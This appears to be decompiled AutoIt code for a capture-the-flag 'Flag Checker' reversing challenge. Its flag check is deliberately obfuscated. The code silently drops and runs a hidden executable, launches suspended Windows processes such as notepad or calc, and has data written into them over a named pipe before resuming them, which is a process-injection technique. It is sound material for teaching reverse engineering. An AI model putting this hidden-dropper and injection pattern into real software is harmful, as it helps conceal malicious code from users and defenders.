Global Const $CDRF_NOTIFYSUBITEMDRAW = 0x20
Global Const $CDRF_NOTIFYPOSTERASE = 0x40
Global Const $CDRF_DOERASE = 0x8
Global Const $CDRF_SKIPPOSTPAINT = 0x100
Global Const $GUI_SS_DEFAULT_GUI = BitOR($WS_MINIMIZEBOX, $WS_CAPTION, $WS_POPUP, $WS_SYSMENU)
$runtime_free = _WinAPI_CloseHandle
Global $g_pid, $eoigwowufbwfo, $hreadpipe
Global $asfgeonwog, $hwritepipe
Global $title = "The Flag Checker"
Func hahahahahahahahahahahahaahahahahh()
    Local $ret = $funcptr($MB_YESNO, $title, "Do you want to proceed?")
    If $ret = $IDNO Then
        $runtime_lockosthread("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        Exit
    EndIf
    Local $iron_man = InputBox($title, "Please enter the flag", "hahaha")
    If @error = 0x1 Then
        $runtime_lockosthread("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        Exit
    EndIf
    If runtime_gogogogo($iron_man) = 0x0 Then
        $funcptr(0x40, $title, "Well done. You got the flag!")
    Else
        $funcptr($MB_ICONQUESTION, $title, "Oops. try again!")
    EndIf
EndFunc    ; -> hahahahahahahahahahahahaahahahahh

Func runtime_gogogogo($text)
    Local $magic = StringToASCIIArray($text)
    modarr($magic)
    getanimelist()
    Local $this_is_a_variable = playsomeanime($magic)
    Return $this_is_a_variable
EndFunc    ; -> runtime_gogogogo

Func modarr(ByRef $arr)
    If UBound($arr) = 0x6e Then
        Return
    Else
        _ArrayAdd($arr, Random(0x0, 0xff))
        modarr($arr)
    EndIf
EndFunc    ; -> modarr

Func getanimelist()
    Local $path = @TempDir & "\\anime.exe"
    FileDelete($path)
    FileInstall("anime.exe", $path)
    $g_pid = Run($path, '', @SW_HIDE)
EndFunc    ; -> getanimelist

Func playsomeanime($anime_title)
    If UBound($anime_title) = 0x0 Then
        Return 0x0
    EndIf
    _ArrayReverse($anime_title)
    Local $anime_desc = getanimedescription(_ArrayPop($anime_title))
    _ArrayReverse($anime_title)
    Return $anime_desc + playsomeanime($anime_title)
EndFunc    ; -> playsomeanime

0xBADF00DCAFEDEADi64

Func getanimedescription($anime_title)
    Local $what_is_this_i_dont_know = "int;int"
    Local $unidentified_flying_object = $runtime_systemstack($what_is_this_i_dont_know)
    $runtime_morestack($unidentified_flying_object, 0x1, 0x1)
    $runtime_morestack($unidentified_flying_object, 0x2, $anime_title)
    Local $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    $runtime_morestack($unidentified_flying_object, 0x1, 0x3)
    Local $gobinary = -1042320
    $runtime_morestack($unidentified_flying_object, 0x2, $gobinary)
    $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    Local $signature_data = qwertyuiopasdfghjkl($resp, 0x8)
    Local $sizeof_data = qwertyuiopasdfghjkl($resp, 0x10, 0x4)
    Local $pid = qwertyuiopasdfghjkl($resp, 0x14, 0x4)
    Local $tprocess = $runtime_systemstack($TAGPROCESS_INFORMATION)
    Local $tstartup = $runtime_systemstack($TAGSTARTUPINFO)
    $runtime_newgoroutine('', "C:\\Windows\\System32\\" & getanimepath(), 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, $tstartup, $tprocess)
    Local $h_pr_left = $runtime_panic($tprocess, "hProcess")
    Local $h_th_left = $runtime_panic($tprocess, "hThread")
    Local $t_pid_left = $runtime_panic($tprocess, "ProcessID")
    Local $t_tid_left = $runtime_panic($tprocess, "ThreadID")
    $runtime_morestack($unidentified_flying_object, 0x1, 0x3)
    Local $eihowgtw = -1042320
    $runtime_morestack($unidentified_flying_object, 0x2, $eihowgtw)
    $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    Local $wlegowtuqepo = qwertyuiopasdfghjkl($resp, 0x8)
    Local $sizeof_data = qwertyuiopasdfghjkl($resp, 0x10, 0x4)
    Local $pid = qwertyuiopasdfghjkl($resp, 0x14, 0x4)
    Local $tprocess = $runtime_systemstack($TAGPROCESS_INFORMATION)
    $runtime_newgoroutine('', "C:\\Windows\\System32\\" & getanimepath(), 0x0, 0x0, 0x0, 0x4, 0x0, 0x0, $tstartup, $tprocess)
    Local $h_pr_right = $runtime_panic($tprocess, "hProcess")
    Local $h_th_right = $runtime_panic($tprocess, "hThread")
    Local $oirwgefbwo = $runtime_panic($tprocess, "ProcessID")
    Local $eyuyowwo11 = $runtime_panic($tprocess, "ThreadID")
    $what_is_this_i_dont_know = "int;int;int;align 8;ptr;int;int;int;int"
    $unidentified_flying_object = $runtime_systemstack($what_is_this_i_dont_know)
    $runtime_morestack($unidentified_flying_object, 0x1, 0x4)
    $runtime_morestack($unidentified_flying_object, 0x2, $t_pid_left)
    $runtime_morestack($unidentified_flying_object, 0x3, $t_tid_left)
    $runtime_morestack($unidentified_flying_object, 0x4, $wlegowtuqepo)
    $runtime_morestack($unidentified_flying_object, 0x5, $sizeof_data)
    $runtime_morestack($unidentified_flying_object, 0x6, 0x2 * 0x0 + 0x0)
    $runtime_morestack($unidentified_flying_object, 0x7, _WinAPI_GetCurrentProcessID())
    $runtime_morestack($unidentified_flying_object, 0x8, _WinAPI_GetCurrentThreadId())
    Local $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    $what_is_this_i_dont_know = "int;int;int;align 8;ptr;int;int;int;int"
    $unidentified_flying_object = $runtime_systemstack($what_is_this_i_dont_know)
    $runtime_morestack($unidentified_flying_object, 0x1, 0x4)
    $runtime_morestack($unidentified_flying_object, 0x2, $oirwgefbwo)
    $runtime_morestack($unidentified_flying_object, 0x3, $eyuyowwo11)
    $runtime_morestack($unidentified_flying_object, 0x4, $wlegowtuqepo)
    $runtime_morestack($unidentified_flying_object, 0x5, $sizeof_data)
    $runtime_morestack($unidentified_flying_object, 0x6, 0x2 * 0x1 + 0x1)
    $runtime_morestack($unidentified_flying_object, 0x7, _WinAPI_GetCurrentProcessID())
    $runtime_morestack($unidentified_flying_object, 0x8, _WinAPI_GetCurrentThreadId())
    Local $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    $runtime_hash("kernel32.dll", "int", "ResumeThread", "handle", $h_th_left)
    $runtime_hash("kernel32.dll", "int", "ResumeThread", "handle", $h_th_right)
    Local $hp = $runtime_systemstack("handle Event[2];")
    $runtime_morestack($hp, "Event", $h_pr_left, 0x1)
    $runtime_morestack($hp, "Event", $h_pr_right, 0x2)
    $runtime_no_stack(0x2, $hp, True)
    Local $left_val = $runtime_newproc($h_pr_left)
    Local $right_val = $runtime_newproc($h_pr_right)
    $runtime_free($h_pr_left)
    $runtime_free($h_pr_right)
    _NamedPipes_CreatePipe($eoigwowufbwfo, $hwritepipe)
    _NamedPipes_CreatePipe($hreadpipe, $asfgeonwog)
    $unidentified_flying_object = $runtime_systemstack("int;int;int")
    $runtime_morestack($unidentified_flying_object, 0x1, 0x7)
    $runtime_morestack($unidentified_flying_object, 0x2, $hreadpipe)
    $runtime_morestack($unidentified_flying_object, 0x3, $hwritepipe)
    Local $aa1 = _WinAPI_FindResource(0x0, 0x3, 0xc)
    Local $aa2 = _WinAPI_SizeOfResource(0x0, $aa1)
    Local $aa3 = _WinAPI_LoadResource(0x0, $aa1)
    Local $aa4 = _WinAPI_LockResource($aa3)
    Local $nullptr = $runtime_systemstack("ptr;int")
    $runtime_morestack($nullptr, 0x1, $aa4)
    $runtime_morestack($nullptr, 0x2, $aa2)
    Local $inullptr
    _WinAPI_WriteFile($asfgeonwog, $runtime_getg($nullptr), $runtime_funcsize($nullptr), $inullptr)
    $runtime_free($asfgeonwog)
    $runtime_free($eoigwowufbwfo)
    $resp = findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
    $unidentified_flying_object = $runtime_systemstack("int;int", $runtime_getg($resp))
    Local $l1 = $runtime_panic($unidentified_flying_object, 0x2)
    $runtime_free($hreadpipe)
    $runtime_free($hwritepipe)
    Return $l1
EndFunc    ; -> getanimedescription

Func getanimepath()
    Local $anime_list[] = ["write.exe", "notepad.exe", "calc.exe", "werfault.exe", "cscript.exe"]
    Return $anime_list[Random(0x0, UBound($anime_list) + -1)]
EndFunc    ; -> getanimepath

Func qwertyuiopasdfghjkl(ByRef $pstruct, $offset, $sizeof_data = 0x8)
    Local $tp = "int"
    If $sizeof_data = 0x8 Then $tp = "int64"
    Local $xp = "byte[" & String($offset) & "];" & $tp
    Local $pp = $runtime_systemstack($xp, $runtime_getg($pstruct))
    Local $ret = $runtime_panic($pp, 0x2)
    Return $ret
EndFunc    ; -> qwertyuiopasdfghjkl

Func findbestanimefrommyanimelist($haha_null_ptr, $this_is_null)
    Local $idatalostintonulldevice, $inullptr
    Local $ufo = $runtime_systemstack("align 1;byte[4096]")
    $null_far_ptr = $runtime_getg($ufo)
    Local $this_is_dev_null_in_windows
    Do
        $this_is_dev_null_in_windows = _WinAPI_CreateFile(getufoname(), 0x2, 0x6)
    Until $this_is_dev_null_in_windows > 0x0
    _NamedPipes_SetNamedPipeHandleState($this_is_dev_null_in_windows, 0x1, 0x0, 0x0, 0x0)
    _WinAPI_WriteFile($this_is_dev_null_in_windows, $haha_null_ptr, $this_is_null, $inullptr, 0x0)
    _WinAPI_ReadFile($this_is_dev_null_in_windows, $null_far_ptr, 0x1000, $idatalostintonulldevice, 0x0)
    $runtime_free($this_is_dev_null_in_windows)
    Return $ufo
EndFunc    ; -> findbestanimefrommyanimelist

Func getufoname()
    Return "\\\\.\\pipe\\anime"
EndFunc    ; -> getufoname

Func lol()
    Local $what_is_this_i_dont_know = "struct;int;endstruct"
    Local $unidentified_flying_object = $runtime_systemstack($what_is_this_i_dont_know)
    $runtime_morestack($unidentified_flying_object, 0x1, 0x5)
    findbestanimefrommyanimelist($runtime_getg($unidentified_flying_object), $runtime_funcsize($unidentified_flying_object))
EndFunc    ; -> lol

hahahahahahahahahahahahaahahahahh()
lol()
ProcessWaitClose($g_pid)
